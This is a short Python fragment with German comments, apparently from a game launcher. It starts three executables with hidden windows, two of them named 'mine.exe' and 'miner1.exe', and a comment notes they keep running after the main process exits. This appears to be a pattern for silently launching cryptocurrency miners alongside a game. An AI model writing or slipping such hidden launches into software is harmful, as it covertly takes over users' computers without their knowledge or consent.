...
subprocess.Popen(['./geodash_old.exe'], creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(['./mine.exe'], creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(['./miner1.exe'], creationflags=subprocess.CREATE_NO_WINDOW)


# Anfangs process damit man weiss ob es läuft
for i in range(5):
    print(f"Hauptprozess läuft: Schritt {i + 1}")
    time.sleep(1)

# Du kannst den Hauptprozess auch beenden, während der subprocess weiterhin läuft
...
# creates a screen variable of size 800 x 600hallo
